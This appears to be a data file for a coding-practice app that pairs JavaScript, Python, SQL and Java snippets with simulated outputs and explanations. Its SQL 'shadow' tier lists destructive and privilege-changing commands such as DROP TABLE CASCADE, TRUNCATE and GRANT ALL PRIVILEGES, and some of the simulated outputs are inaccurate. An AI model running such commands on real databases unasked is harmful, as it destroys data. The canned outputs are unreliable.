import React from "react";

export type LanguageKey = "javascript" | "python" | "java" | "cpp" | "c" | "csharp" | "html" | "css" | "ruby" | "r" | "rust" | "solidity" | "sql" | "bash" | "go" | "swift" | "kotlin";
export type TierKey = "beginner" | "intermediate" | "master" | "legend" | "shadow";

export interface LanguageLevel {
    ghost: string;
    output: React.ReactNode;
    explanation?: string;
    input?: {
        prompts: string[];
        handler: (args: string[]) => string;
    };
}

export interface LanguageConfig {
    name: string;
    reference?: React.ReactNode;
    tiers: Record<TierKey, LanguageLevel[]>;
}

export const TIERS: { key: TierKey; label: string; color: string }[] = [
    { key: "beginner", label: "Beginner", color: "#00ff9c" },
    { key: "intermediate", label: "Intermediate", color: "#ffbd2e" },
    { key: "master", label: "Master", color: "#ff5f56" },
    { key: "legend", label: "Legend", color: "#bd00ff" },
    { key: "shadow", label: "SHADOW", color: "#333" },
];

export const LANGUAGES: Record<LanguageKey, LanguageConfig> = {
    javascript: {
        name: "JavaScript",
        tiers: {
            beginner: [
                { ghost: `console.log("Hello ShadowCoders");`, output: "Hello ShadowCoders", explanation: "The console.log() method outputs a message to the web console. It is the most common way to debug code and verify variable values during development." },
                { 
                    ghost: `const sum = (a, b) => a + b;`, 
                    output: "Function defined", 
                    explanation: "Arrow functions provide a concise syntax for writing function expressions. They are often used for short, one-line functions and do not have their own 'this' context.",
                    input: {
                        prompts: ["Enter a: ", "Enter b: "],
                        handler: (args) => {
                            const res = parseFloat(args[0]) + parseFloat(args[1]);
                            return isNaN(res) ? "NaN" : res.toString();
                        }
                    }
                },
                { ghost: `[1, 2, 3].map(x => x * 2);`, output: "[2, 4, 6]", explanation: "The map() method creates a new array by calling a specific function on each element in the original array. Here, we multiply every number by 2." },
                { ghost: `let x = 10;\nif (x > 5) console.log("Big");`, output: "Big", explanation: "The if statement executes code only if a specified condition is true. It is the fundamental building block of logic and decision-making in programming." },
                { ghost: `const name = "Shadow";\nconsole.log(\`Hello \${name}\`);`, output: "Hello Shadow", explanation: "Template literals (backticks) allow for embedded expressions and multi-line strings. The ${} syntax is used to insert variables directly into the string." },
                { ghost: `const obj = { id: 1, val: "A" };`, output: "undefined", explanation: "Objects are collections of key-value pairs used to store related data. Here, 'id' and 'val' are properties of the 'obj' object." },
                { 
                    ghost: `function multiply(a, b) {\n  return a * b;\n}`, 
                    output: "Function defined", 
                    explanation: "Functions are reusable blocks of code designed to perform a particular task. They can take inputs (arguments) and return an output.",
                    input: {
                        prompts: ["Enter a: ", "Enter b: "],
                        handler: (args) => {
                            const res = parseFloat(args[0]) * parseFloat(args[1]);
                            return isNaN(res) ? "NaN" : res.toString();
                        }
                    }
                },
                { ghost: `let count = 0;\ncount++;\nconsole.log(count);`, output: "1", explanation: "The increment operator (++) increases a variable's value by 1. It is commonly used in loops and counters." },
                { ghost: `const arr = [1, 2, 3];\narr.push(4);`, output: "4", explanation: "The push() method adds one or more elements to the end of an array and returns the new length of the array. It modifies the original array." },
                { ghost: `const isTrue = true && false;`, output: "false", explanation: "The logical AND operator (&&) returns true only if both operands are true. If either is false, the result is false." }
            ],
            intermediate: [
                { ghost: `for(let i=0; i<5; i++) { console.log("* ".repeat(i+1)); }`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "String.repeat() is a useful method for creating patterns." },
                { ghost: `const arr = [1, 6]; const filtered = arr.filter(x => x > 5);`, output: "undefined", explanation: "The filter() method creates a new array with all elements that pass the test implemented by the provided function. Elements that fail are removed." },
                { ghost: `async function fetchData() {\n  return await Promise.resolve('data');\n}`, output: "Promise { <pending> }", explanation: "Async/await makes asynchronous code look and behave like synchronous code. 'await' pauses execution until the Promise resolves." },
                { ghost: `const user = { name: "Shadow", age: 25 };\nconst { name, age } = user;`, output: "name='Shadow', age=25", explanation: "Destructuring assignment allows you to unpack values from arrays or properties from objects into distinct variables." },
                { ghost: `const items = [1, 2];\nconst newItem = 3;\nconst copy = [...items, newItem];`, output: "[1, 2, 3]", explanation: "The spread syntax (...) expands an array into individual elements. It's often used to create copies of arrays or merge them." },
                { ghost: `class User {\n  constructor(name) {\n    this.name = name;\n  }\n} const u = new User("Shadow");`, output: "Class defined", explanation: "Classes are templates for creating objects. They encapsulate data and behavior. The constructor is a special method for initializing new objects." },
                { ghost: `try {\n  throw new Error("Oops");\n} catch (e) {\n  console.log(e.message);\n}`, output: "Oops", explanation: "The try...catch statement marks a block of statements to try and specifies a response should an exception be thrown." },
                { ghost: `const unique = new Set([1, 1, 2]);`, output: "Set(2) { 1, 2 }", explanation: "A Set is a collection of unique values. Duplicates are automatically removed when added to a Set." },
                { ghost: `const map = new Map();\nmap.set("key", "value");`, output: "Map(1) { 'key' => 'value' }", explanation: "The Map object holds key-value pairs and remembers the original insertion order of the keys. Unlike objects, keys can be of any type." },
                { ghost: `document.getElementById("root");`, output: "<div id='root'>Content</div>", explanation: "The DOM (Document Object Model) allows JavaScript to interact with HTML. This method retrieves an element by its unique ID." },
                { ghost: `setTimeout(() => console.log("Done"), 1000);`, output: "undefined", explanation: "setTimeout executes a function after a specified delay (in milliseconds). It demonstrates JavaScript's asynchronous nature." }
            ],
            master: [
                { ghost: `const memoize = (fn) => {\n  const cache = {};\n  return (...args) => {\n    const key = JSON.stringify(args);\n    return cache[key] || (cache[key] = fn(...args));\n  };\n};`, output: "Function defined", explanation: "Memoization is an optimization technique used to speed up computer programs by storing the results of expensive function calls and returning the cached result when the same inputs occur again." },
                { ghost: `function* generator() {\n  yield 1;\n  yield 2;\n}`, output: "Generator defined", explanation: "Generators are functions that can be exited and later re-entered. Their context (variable binding) will be saved across re-entrances." },
                { ghost: `const target = {};\nconst handler = {};\nconst proxy = new Proxy(target, handler);`, output: "Proxy created", explanation: "The Proxy object enables you to create a proxy for another object, which can intercept and redefine fundamental operations for that object." },
                { ghost: `const compose = (...fns) => x => fns.reduceRight((y, f) => f(y), x);`, output: "undefined", explanation: "Function composition is the process of combining two or more functions to produce a new function. Composing f and g produces f(g(x))." },
                { ghost: `const curried = a => b => a + b;`, output: "undefined", explanation: "Currying is the technique of converting a function that takes multiple arguments into a sequence of functions that each take a single argument." },
                { ghost: `const obj = {}; Object.defineProperty(obj, 'prop', {\n  value: 42,\n  writable: false\n});`, output: "undefined", explanation: "Object.defineProperty() defines a new property directly on an object, or modifies an existing property, and returns the object. It allows precise control over property behavior." },
                { ghost: `const worker = new Worker('worker.js');`, output: "undefined", explanation: "Web Workers make it possible to run a script operation in a background thread separate from the main execution thread of a web application." },
                { ghost: `const socket = new WebSocket('ws://host');`, output: "undefined", explanation: "The WebSocket API is an advanced technology that makes it possible to open a two-way interactive communication session between the user's browser and a server." },
                { ghost: `const loop = () => {}; requestAnimationFrame(loop);`, output: "undefined", explanation: "requestAnimationFrame tells the browser that you wish to perform an animation and requests that the browser calls a specified function to update an animation before the next repaint." },
                { ghost: `const cb = () => {}; const obs = new IntersectionObserver(cb);`, output: "undefined", explanation: "The Intersection Observer API provides a way to asynchronously observe changes in the intersection of a target element with an ancestor element or with a top-level document's viewport." }
            ],
            legend: [
                { ghost: `// Redux Store\nconst createStore = (r) => {\n  let s, l=[];\n  const dispatch = (a) => { s = r(s, a); l.forEach(x=>x()); };\n  return { getState:()=>s, dispatch, subscribe: (f)=>l.push(f) };\n};`, output: "undefined", explanation: "A minimal implementation of Redux. It manages a state tree, allows dispatching actions to mutate state via a reducer, and notifies subscribers of changes." },
                { ghost: `// Deep Clone\nconst deepClone = (obj) => JSON.parse(JSON.stringify(obj));`, output: "undefined", explanation: "A simple way to deep clone objects using JSON serialization. Note: This method fails with functions, undefined, and circular references." },
                { ghost: `// Promisify\nconst promisify = fn => (...args) => new Promise((res, rej) => fn(...args, (e, r) => e ? rej(e) : res(r)));`, output: "undefined", explanation: "Converts a callback-based function into a Promise-based one. This allows using async/await with older Node.js-style APIs." },
                { ghost: `// Debounce\nconst debounce = (fn, ms) => {\n  let t;\n  return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); };\n};`, output: "undefined", explanation: "Debouncing enforces that a function not be called again until a certain amount of time has passed without it being called. Useful for search inputs." },
                { ghost: `// Throttle\nconst throttle = (fn, ms) => {\n  let last = 0;\n  return (...a) => { const now = Date.now(); if (now - last >= ms) { fn(...a); last = now; } };\n};`, output: "undefined", explanation: "Throttling enforces a maximum number of times a function can be called over time. Useful for scroll events." },
                { ghost: `// Bind Polyfill\nFunction.prototype.myBind = function(ctx, ...args) {\n  return (...rest) => this.apply(ctx, [...args, ...rest]);\n};`, output: "undefined", explanation: "A polyfill for Function.prototype.bind. It returns a new function with 'this' explicitly set to the provided context, along with any preset arguments." },
                { ghost: `// Event Emitter\nclass Emitter { on(e, f) { (this.e||(this.e={}))[e]?.push(f); } emit(e, ...a) { this.e?.[e]?.forEach(f=>f(...a)); } }`, output: "undefined", explanation: "The Publish-Subscribe pattern allows objects to communicate without being directly coupled. Emitters broadcast events to any listeners." },
                { ghost: `// LRU Cache\nclass LRU { constructor(c) { this.c=c; this.m=new Map(); } get(k) { if(!this.m.has(k)) return -1; const v=this.m.get(k); this.m.delete(k); this.m.set(k,v); return v; } }`, output: "undefined", explanation: "Least Recently Used (LRU) cache discards the least recently used items first. Using a Map preserves insertion order, making it efficient for this purpose." },
                { ghost: `// BST Insert\ninsert(v) { if(!this.root) this.root={v}; else { let c=this.root; while(c) { if(v<c.v) c=c.l||(c.l={v}); else c=c.r||(c.r={v}); } } }`, output: "undefined", explanation: "Binary Search Tree insertion logic. It traverses down left (smaller) or right (larger) branches until a valid empty spot is found." },
                { ghost: `// Async Gen\nasync function* gen() { yield await Promise.resolve(1); }`, output: "undefined", explanation: "Async generators combine generators and promises, allowing you to use 'await' and 'yield' together for streaming asynchronous data." }
            ],
            shadow: [
                { ghost: `eval("console.log('Shadow')");`, output: "Shadow", explanation: "Metaprogramming involves writing code that writes or manipulates other code. eval() executes a string as code, but is dangerous and generally discouraged." },
                { ghost: `const Y = f => (x => x(x))(x => f(y => x(x)(y)));`, output: "undefined", explanation: "The Y Combinator allows recursion in anonymous functions (lambdas) that don't have a name to refer to themselves." },
                { ghost: `(function a(){console.log('('+a+')()')})()`, output: "(function a(){console.log('('+a+')()')})()", explanation: "A Quine is a non-empty computer program which takes no input and produces a copy of its own source code as its only output." },
                { ghost: `// Fast Inv Sqrt\n// 0x5f3759df`, output: "undefined", explanation: "The Fast Inverse Square Root algorithm uses bit-level hacking to compute 1/sqrt(x) much faster than standard division, famous from Quake III Arena." },
                { ghost: `// Brainf*ck\n// ++++++++[>++++[>++>+++<<-]<-]>>.>---.`, output: "Hi", explanation: "Brainf*ck is an esoteric programming language noted for its extreme minimalism. It mimics a Turing machine with a tape and a pointer." },
                { ghost: `// Zero-width\n// "H​i"`, output: "undefined", explanation: "Steganography is the practice of concealing a message within another message. Zero-width characters can hide data in plain text strings." },
                { ghost: `document.body.attachShadow({mode:'open'});`, output: "undefined", explanation: "Shadow DOM allows you to attach a hidden, separate DOM tree to an element. It provides encapsulation for CSS and JavaScript." },
                { ghost: `WebAssembly.instantiate(bytes);`, output: "undefined", explanation: "WebAssembly (Wasm) is a binary instruction format for a stack-based virtual machine, allowing code like C++ or Rust to run in the browser at near-native speed." },
                { ghost: `navigator.serviceWorker.register('/sw.js');`, output: "undefined", explanation: "Service Workers act as proxy servers that sit between web applications and the browser, enabling offline capabilities and background sync." },
                { ghost: `void(0);`, output: "undefined", explanation: "The void operator evaluates an expression and returns undefined. It is often used to prevent links from navigating (e.g., href='javascript:void(0)')." }
            ]
        }
    },
    python: {
        name: "Python",
        tiers: {
            beginner: [
                { ghost: `print("Hello ShadowCoders")`, output: "Hello ShadowCoders", explanation: "The print() function sends data to the standard output device (screen). It is the most basic way to output text in Python." },
                { 
                    ghost: `def add(a, b):\n    return a + b`, 
                    output: "Function defined", 
                    explanation: "Functions are defined using the 'def' keyword. They are reusable blocks of code that perform specific tasks and can return values.",
                    input: {
                        prompts: ["Enter value for a: ", "Enter value for b: "],
                        handler: (args) => {
                            const sum = parseFloat(args[0]) + parseFloat(args[1]);
                            return isNaN(sum) ? "Error: Invalid numbers" : sum.toString();
                        }
                    }
                },
                { ghost: `numbers = [1, 2, 3]\nprint(numbers[0])`, output: "1", explanation: "Lists are ordered, mutable collections of items. You can access elements by their index, starting at 0 for the first element." },
                { ghost: `for i in range(3):\n    print(i)`, output: "0\n1\n2", explanation: "Loops allow you to execute a block of code multiple times. The 'for' loop iterates over a sequence (like a range of numbers)." },
                { ghost: `x = 5\nif x > 10:\n    print("Big")\nelse:\n    print("Small")`, output: "Small", explanation: "Conditional statements (if/else) allow the program to make decisions based on whether a condition is true or false." },
                { ghost: `x = 5\nwhile x > 0:\n    print(x)\n    x -= 1`, output: "5\n4\n3\n2\n1", explanation: "A while loop repeatedly executes a block of code as long as a given condition is true. Be careful of infinite loops!" },
                { ghost: `person = {"name": "Shadow", "lvl": 99}`, output: "Dictionary created", explanation: "Dictionaries are unordered collections of key-value pairs. They are fast and efficient for looking up values based on unique keys." },
                { ghost: `try:\n    x = 1 / 0\nexcept ZeroDivisionError:\n    print("Error")`, output: "Error", explanation: "Exception handling allows you to manage runtime errors gracefully using try and except blocks, preventing the program from crashing." },
                { 
                    ghost: `name = input("Enter name: ")`, 
                    output: "Input captured", 
                    explanation: "The input() function pauses program execution to wait for the user to type some text and press Enter.",
                    input: {
                        prompts: ["Enter name: "],
                        handler: (args) => `User entered: ${args[0]}`
                    }
                },
                { ghost: `import math\nprint(math.sqrt(16))`, output: "4.0", explanation: "Modules allow you to organize code. The 'import' statement gives you access to functions and classes defined in other files or libraries." }
            ],
            intermediate: [
                { ghost: `for i in range(5):\n    print("* " * (i+1))`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "String multiplication makes pattern printing easy in Python." },
                { ghost: `[x * 2 for x in [1, 2, 3]]`, output: "[2, 4, 6]", explanation: "List comprehensions provide a concise way to create lists. It consists of brackets containing an expression followed by a for clause." },
                { ghost: `lambda x: x * 2`, output: "<function <lambda>>", explanation: "Lambda functions are small anonymous functions. They can take any number of arguments, but can only have one expression." },
                { ghost: `def my_gen():\n    yield 1\n    yield 2`, output: "Generator created", explanation: "Generators are iterators, a kind of iterable you can only iterate over once. They generate values on the fly using the 'yield' keyword." },
                { ghost: `with open("file.txt", "r") as f:\n    content = f.read()`, output: "File read", explanation: "Context managers (the 'with' statement) allow you to allocate and release resources precisely. Commonly used for opening files." },
                { ghost: `class Dog:\n    def __init__(self, name):\n        self.name = name`, output: "Class defined", explanation: "Classes are blueprints for creating objects. The __init__ method is the constructor that initializes the object's attributes." },
                { ghost: `decorators = [f1, f2]\n@f1\ndef func(): pass`, output: "Decorator defined", explanation: "Decorators are a powerful way to modify the behavior of a function or class. They wrap another function to extend its behavior without modifying it." },
                { ghost: `args = (1, 2)\nkwargs = {'x': 3}\nfunc(*args, **kwargs)`, output: "Function called", explanation: "The *args and **kwargs syntax allows a function to accept an arbitrary number of positional and keyword arguments, or to unpack them." },
                { ghost: `set_a = {1, 2, 3}\nset_b = {3, 4, 5}\nprint(set_a & set_b)`, output: "{3}", explanation: "Sets are unordered collections of unique elements. They support mathematical operations like union, intersection, and difference." },
                { ghost: `from collections import Counter\nc = Counter("banana")`, output: "Counter({'a': 3, 'n': 2, 'b': 1})", explanation: "The collections module implements specialized container datatypes. Counter is a dict subclass for counting hashable objects." },
                { ghost: `assert 1 == 1, "Math broken"`, output: "Assertion passed", explanation: "Assertions are statements that assert or state a fact confidently in your program. If the condition is false, the program raises an AssertionError." }
            ],
            master: [
                { ghost: `l = [1, 2]; l.append(3);`, output: "List modified", explanation: "DSA: Lists (Dynamic Arrays)." },
                { ghost: `d = {'a': 1}; d['b'] = 2;`, output: "Dict updated", explanation: "DSA: Dictionaries (Hash Maps)." },
                { ghost: `s = {1, 2}; s.add(3);`, output: "Set updated", explanation: "DSA: Sets (Hash Sets)." },
                { ghost: `from collections import deque\nq = deque([1, 2])`, output: "Deque created", explanation: "DSA: Deque (Double-ended Queue)." },
                { ghost: `import heapq\nh = []; heapq.heappush(h, 1)`, output: "Heap pushed", explanation: "DSA: Heapq (Min Heap)." },
                { ghost: `class Meta(type):\n    pass`, output: "Metaclass defined", explanation: "Metaclasses are the 'classes of classes'. They define how a class behaves. A class is an instance of a metaclass." },
                { ghost: `import asyncio\nasync def main():\n    await asyncio.sleep(1)`, output: "Async task", explanation: "AsyncIO is a library to write concurrent code using the async/await syntax. It is used for high-performance network and web-servers." },
                { ghost: `import threading\nt = threading.Thread(target=worker)`, output: "Thread started", explanation: "Threading allows you to run multiple operations concurrently in the same process space. Useful for I/O-bound tasks." },
                { ghost: `import multiprocessing\np = multiprocessing.Process(target=worker)`, output: "Process created", explanation: "Multiprocessing supports spawning processes using an API similar to the threading module. It bypasses the GIL and leverages multiple CPU cores." },
                { ghost: `import itertools\niter = itertools.cycle([1, 2])`, output: "Iterator created", explanation: "Itertools provides a set of fast, memory-efficient tools for creating iterators for efficient looping." }
            ],
            legend: [
                { ghost: `sorted([3, 1, 2])`, output: "[1, 2, 3]", explanation: "DSA: Sorting (TimSort, O(N log N))." },
                { ghost: `import bisect\nidx = bisect.bisect_left([1, 2, 4], 3)`, output: "2", explanation: "DSA: Bisect (Binary Search)." },
                { ghost: `graph = {'A': ['B'], 'B': ['C']}`, output: "Graph defined", explanation: "DSA: Graphs (Adjacency List)." },
                { ghost: `sys.setrecursionlimit(2000)`, output: "Limit set", explanation: "Modifying the recursion limit allows deeper recursion stacks, but increases the risk of stack overflow crashes." },
                { ghost: `import ctypes`, output: "Library loaded", explanation: "ctypes is a foreign function library for Python. It provides C compatible data types and allows calling functions in DLLs or shared libraries." },
                { ghost: `from contextlib import contextmanager`, output: "Context manager", explanation: "The @contextmanager decorator allows you to define a factory function for 'with' statement context managers, without creating a class." },
                { ghost: `import gc\ngc.collect()`, output: "Garbage collected", explanation: "The gc module provides an interface to the optional garbage collector. You can manually trigger garbage collection to free memory." },
                { ghost: `import inspect`, output: "Module imported", explanation: "The inspect module provides several useful functions to help get information about live objects, such as modules, classes, methods, functions, tracebacks, frame objects, and code objects." },
                { ghost: `__slots__ = ['x']`, output: "Slots defined", explanation: "__slots__ allows you to explicitly declare data members, preventing the creation of __dict__ and saving memory." },
                { ghost: `import socket`, output: "Socket created", explanation: "The socket module provides access to the BSD socket interface. It is the foundation of network programming in Python." }
            ],
            shadow: [
                { ghost: `import multiprocessing # GIL Bypass`, output: "GIL bypassed", explanation: "The Global Interpreter Lock (GIL) prevents multiple native threads from executing Python bytecodes at once. Multiprocessing bypasses this by using separate processes." },
                { ghost: `Class.method = new_method`, output: "Method patched", explanation: "Monkey patching is the dynamic replacement of attributes at runtime. It is often used for testing or hot-fixing code." },
                { ghost: `from abc import ABC`, output: "ABC imported", explanation: "Abstract Base Classes (ABCs) provide a way to define interfaces that other classes must implement, enforcing a contract." },
                { ghost: `class D:\n def __get__(self, i, o): pass`, output: "Descriptor defined", explanation: "Descriptors are objects that customize attribute access (get, set, delete). They are the mechanism behind properties, methods, and class methods." },
                { ghost: `def c():\n x = yield`, output: "Coroutine defined", explanation: "Coroutines are generalizations of subroutines. They are used for cooperative multitasking where a process voluntarily yields control periodically." },
                { ghost: `import ast`, output: "AST parsed", explanation: "The ast module helps Python applications to process trees of the Python abstract syntax grammar. You can analyze and modify code structure programmatically." },
                { ghost: `memoryview(b"abc")`, output: "View created", explanation: "Memory views allow Python code to access the internal data of an object that supports the buffer protocol without copying. Crucial for high-performance I/O." },
                { ghost: `cdef int x = 0`, output: "Variable declared", explanation: "Cython is a superset of Python that compiles to C. It allows you to write C extensions for Python with C-like performance." },
                { ghost: `import pickle`, output: "Module imported", explanation: "Pickling is the process of converting a Python object hierarchy into a byte stream. It is used for serializing and deserializing objects." },
                { ghost: `import this`, output: "Beautiful is better than ugly...", explanation: "The Zen of Python is a collection of 19 software principles that influence the design of the Python programming language." }
            ]
        }
    },
    sql: {
        name: "SQL",
        reference: (
            <div>
                <h4 style={{ color: "#00ff9c", marginBottom: "10px", fontFamily: "sans-serif" }}>Database Schema</h4>
                <div style={{ display: "flex", flexDirection: "column", gap: "15px", fontFamily: "monospace", fontSize: "12px", color: "#ccc" }}>
                    <div>
                        <div style={{ color: "#ffbd2e", marginBottom: "4px" }}>users</div>
                        <div>id (INT), name (TEXT), role (TEXT), r_id (INT), active (BOOL), phone (TEXT)</div>
                    </div>
                    <div>
                        <div style={{ color: "#ffbd2e", marginBottom: "4px" }}>posts</div>
                        <div>id (INT), u_id (INT), content (TEXT)</div>
                    </div>
                    <div>
                        <div style={{ color: "#ffbd2e", marginBottom: "4px" }}>roles</div>
                        <div>id (INT), role (TEXT)</div>
                    </div>
                    <div>
                        <div style={{ color: "#ffbd2e", marginBottom: "4px" }}>results</div>
                        <div>id (INT), name (TEXT), score (INT)</div>
                    </div>
                </div>
            </div>
        ),
        tiers: {
            beginner: [
                { ghost: `SELECT * FROM users;`, output: "id | name\n---+-----", explanation: "The SELECT statement is used to fetch data from a database. The asterisk (*) selects all columns from the 'users' table." },
                { ghost: `SELECT name FROM users;`, output: "name\n----", explanation: "Specifying column names instead of * is better practice. It fetches only the 'name' column, which is more efficient." },
                { ghost: `SELECT * FROM users WHERE id = 1;`, output: "User found", explanation: "The WHERE clause filters records. It returns only rows that meet the specified condition (where id equals 1)." },
                { ghost: `INSERT INTO users (name) VALUES ('Neo');`, output: "INSERT 0 1", explanation: "INSERT INTO is used to add new rows to a table. Here we are adding a new user with the name 'Neo'." },
                { ghost: `UPDATE users SET name = 'Trinity' WHERE id = 1;`, output: "UPDATE 1", explanation: "UPDATE modifies existing records. We are changing the name of the user with id 1 to 'Trinity'." },
                { ghost: `DELETE FROM users WHERE id = 2;`, output: "DELETE 1", explanation: "DELETE removes records from a table. Be careful: omitting the WHERE clause will delete ALL records!" },
                { ghost: `SELECT DISTINCT role FROM users;`, output: "role\n----", explanation: "SELECT DISTINCT returns only unique values. It eliminates duplicate rows from the result set." },
                { ghost: `SELECT * FROM users ORDER BY name;`, output: "Sorted list", explanation: "ORDER BY sorts the result set in ascending (default) or descending (DESC) order based on one or more columns." },
                { ghost: `SELECT * FROM users LIMIT 5;`, output: "First 5 rows", explanation: "LIMIT restricts the number of rows returned. Useful for pagination or previewing large datasets." },
                { ghost: `SELECT COUNT(*) FROM users;`, output: "count\n-----", explanation: "COUNT(*) returns the total number of rows in the table. Aggregate functions perform a calculation on a set of values." }
            ],
            intermediate: [
                { ghost: `SELECT u.name, r.role FROM users u JOIN roles r ON u.r_id = r.id;`, output: "Joined data", explanation: "INNER JOIN selects records that have matching values in both tables. It links users to their roles." },
                { ghost: `SELECT * FROM users LEFT JOIN posts ON users.id = posts.u_id;`, output: "Left joined", explanation: "LEFT JOIN returns all records from the left table (users), and the matched records from the right table (posts). Unmatched right side is NULL." },
                { ghost: `SELECT AVG(score) FROM results;`, output: "avg\n---", explanation: "AVG() is an aggregate function that returns the average value of a numeric column." },
                { ghost: `SELECT MAX(score) FROM results;`, output: "max\n---", explanation: "MAX() returns the largest value of the selected column. MIN() returns the smallest." },
                { ghost: `SELECT role, COUNT(*) FROM users GROUP BY role;`, output: "Group counts", explanation: "GROUP BY groups rows that have the same values into summary rows. Often used with aggregate functions like COUNT." },
                { ghost: `SELECT role FROM users GROUP BY role HAVING COUNT(*) > 5;`, output: "Filtered groups", explanation: "The HAVING clause was added to SQL because the WHERE keyword could not be used with aggregate functions. It filters groups." },
                { ghost: `SELECT * FROM users WHERE name LIKE 'S%';`, output: "Pattern matched", explanation: "The LIKE operator is used in a WHERE clause to search for a specified pattern. '%' represents zero or more characters." },
                { ghost: `SELECT * FROM users WHERE id IN (1, 2, 3);`, output: "In list", explanation: "The IN operator allows you to specify multiple values in a WHERE clause. It is a shorthand for multiple OR conditions." },
                { ghost: `SELECT * FROM users WHERE score BETWEEN 50 AND 100;`, output: "In range", explanation: "The BETWEEN operator selects values within a given range. The values can be numbers, text, or dates." },
                { ghost: `CREATE TABLE logs (id INT, msg TEXT);`, output: "CREATE TABLE", explanation: "CREATE TABLE is used to create a new table in the database. You define columns and their data types." }
            ],
            master: [
                { ghost: `CREATE INDEX idx_name ON users(name);`, output: "CREATE INDEX", explanation: "Indexes are special lookup tables that the database search engine can use to speed up data retrieval. They are invisible to users." },
                { ghost: `CREATE VIEW active_users AS SELECT * FROM users WHERE active=true;`, output: "CREATE VIEW", explanation: "A View is a virtual table based on the result-set of an SQL statement. It simplifies complex queries and adds a layer of security." },
                { ghost: `SELECT * FROM users WHERE id = (SELECT u_id FROM posts LIMIT 1);`, output: "Subquery result", explanation: "A Subquery is a query nested inside another query. It allows you to use the result of one query as input for another." },
                { ghost: `WITH high_scores AS (SELECT * FROM results WHERE score > 90) SELECT * FROM high_scores;`, output: "CTE result", explanation: "Common Table Expressions (CTEs) provide a temporary result set that exists just for one query. They make complex queries more readable." },
                { ghost: `SELECT name, RANK() OVER (ORDER BY score DESC) FROM results;`, output: "Ranked list", explanation: "Window functions perform a calculation across a set of table rows that are somehow related to the current row. RANK() assigns a rank." },
                { ghost: `SELECT COALESCE(phone, 'N/A') FROM users;`, output: "Nulls handled", explanation: "COALESCE returns the first non-null value in a list. Useful for providing default values for NULL columns." },
                { ghost: `SELECT CAST(score AS VARCHAR) FROM results;`, output: "Casted values", explanation: "CAST converts a value (of any type) into a specified datatype. Useful when data types need to match." },
                { ghost: `SELECT CASE WHEN score > 50 THEN 'Pass' ELSE 'Fail' END FROM results;`, output: "Conditional values", explanation: "The CASE expression goes through conditions and returns a value when the first condition is met (like an if-then-else statement)." },
                { ghost: `UNION SELECT * FROM archive_users;`, output: "Combined sets", explanation: "UNION combines the result-set of two or more SELECT statements. It removes duplicates by default (UNION ALL keeps them)." },
                { ghost: `INTERSECT SELECT * FROM active_users;`, output: "Intersection", explanation: "INTERSECT returns only the rows that are present in both result sets." }
            ],
            legend: [
                { ghost: `CREATE FUNCTION get_sum(a INT, b INT) RETURNS INT AS $$ BEGIN RETURN a + b; END; $$ LANGUAGE plpgsql;`, output: "CREATE FUNCTION", explanation: "Stored Functions are reusable SQL code blocks that can accept parameters and return values. Logic resides in the database." },
                { ghost: `CREATE TRIGGER audit AFTER INSERT ON users FOR EACH ROW EXECUTE FUNCTION log_insert();`, output: "CREATE TRIGGER", explanation: "Triggers are special stored procedures that automatically run when an event (INSERT, UPDATE, DELETE) occurs in the database." },
                { ghost: `EXPLAIN ANALYZE SELECT * FROM users;`, output: "Query plan", explanation: "EXPLAIN ANALYZE shows the execution plan of a statement and how long it took. Critical for performance tuning." },
                { ghost: `BEGIN; UPDATE accounts SET bal = bal - 100; UPDATE accounts SET bal = bal + 100; COMMIT;`, output: "COMMIT", explanation: "Transactions ensure data integrity. Either all operations succeed (COMMIT) or none do (ROLLBACK)." },
                { ghost: `LOCK TABLE users IN ACCESS EXCLUSIVE MODE;`, output: "LOCK TABLE", explanation: "Explicit locking allows you to control concurrency. Access Exclusive prevents all other access to the table." },
                { ghost: `SELECT * FROM crosstab('SELECT name, subject, score FROM exams ORDER BY 1,2')`, output: "Pivoted", explanation: "Pivot tables (crosstab) transform rows into columns, useful for reporting and data analysis." },
                { ghost: `SELECT json_agg(u) FROM users u;`, output: "JSON array", explanation: "JSON functions allow SQL to interact with JSON data. json_agg aggregates values into a JSON array." },
                { ghost: `SELECT to_tsvector(doc) @@ to_tsquery('search');`, output: "Text search", explanation: "Full Text Search allows efficient searching of text documents for words and phrases using linguistic rules." },
                { ghost: `REINDEX TABLE users;`, output: "REINDEX", explanation: "Reindexing rebuilds an index. Useful if an index has become corrupted or bloated." },
                { ghost: `VACUUM FULL;`, output: "VACUUM", explanation: "VACUUM reclaims storage occupied by dead tuples. VACUUM FULL rewrites the entire table to minimize disk usage." }
            ],
            shadow: [
                { ghost: `DROP TABLE users CASCADE;`, output: "DROP TABLE", explanation: "DROP TABLE deletes the table and its data. CASCADE also drops objects that depend on the table (like views)." },
                { ghost: `TRUNCATE TABLE logs;`, output: "TRUNCATE", explanation: "TRUNCATE quickly removes all rows from a set of tables. It is faster than DELETE but cannot be rolled back in some DBs." },
                { ghost: `GRANT ALL PRIVILEGES ON DATABASE db TO shadow;`, output: "GRANT", explanation: "GRANT gives specific privileges (like SELECT, INSERT) to users or roles." },
                { ghost: `REVOKE ALL FROM public;`, output: "REVOKE", explanation: "REVOKE removes previously granted privileges." },
                { ghost: `SET search_path TO shadow_schema;`, output: "SET", explanation: "Schemas are namespaces for tables. Setting the search_path determines which schema is checked first for tables." },
                { ghost: `ALTER TABLE users ADD COLUMN shadow_id UUID;`, output: "ALTER", explanation: "ALTER TABLE is used to add, delete, or modify columns in an existing table." },
                { ghost: `COPY users TO '/tmp/dump.csv';`, output: "COPY", explanation: "COPY moves data between PostgreSQL tables and standard file-system files." },
                { ghost: `LISTEN shadow_channel;`, output: "LISTEN", explanation: "LISTEN registers the current session as a listener on the notification channel." },
                { ghost: `NOTIFY shadow_channel, 'Awake';`, output: "NOTIFY", explanation: "NOTIFY sends a notification event together with an optional payload string to each client application that has executed LISTEN." },
                { ghost: `CHECKPOINT;`, output: "CHECKPOINT", explanation: "CHECKPOINT forces the transaction log to be written to disk. It happens automatically but can be forced manually." }
            ]
        }
    },
    java: {
        name: "Java",
        tiers: {
            beginner: [
                { ghost: `System.out.println("Hello");`, output: "Hello", explanation: "System.out.println prints text to the standard output (console) and appends a newline." },
                { ghost: `int x = 10;`, output: "Variable x initialized: 10", explanation: "Variables store data. 'int' is a primitive data type for 32-bit signed integers." },
                { ghost: `int x = 10;\nif (x > 5) { System.out.println("Big"); }`, output: "Big", explanation: "The if statement executes a block of code only if the specified condition is true." },
